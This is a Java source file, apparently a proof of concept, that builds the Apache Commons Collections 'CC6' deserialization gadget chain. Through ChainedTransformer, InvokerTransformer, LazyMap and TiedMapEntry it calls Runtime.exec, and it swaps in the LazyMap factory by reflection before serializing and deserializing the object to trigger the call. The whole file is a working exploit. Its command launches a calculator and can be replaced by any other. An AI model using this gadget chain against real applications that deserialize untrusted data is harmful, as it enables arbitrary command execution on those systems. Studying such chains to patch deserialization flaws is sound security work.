package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args)throws Exception {
        Transformer[] Transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);

        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> Lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(Lazymap,"aa");
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"bb");
        Lazymap.remove("aa");
        Class c=LazyMap.class;
        Field factoryfield=c.getDeclaredField("factory");
        factoryfield.setAccessible(true);
        factoryfield.set(Lazymap,chainedTransformer);
        String s=serialize(hashMap);
        deserialize(s);

    }
    public static String serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize(String data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(data));
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
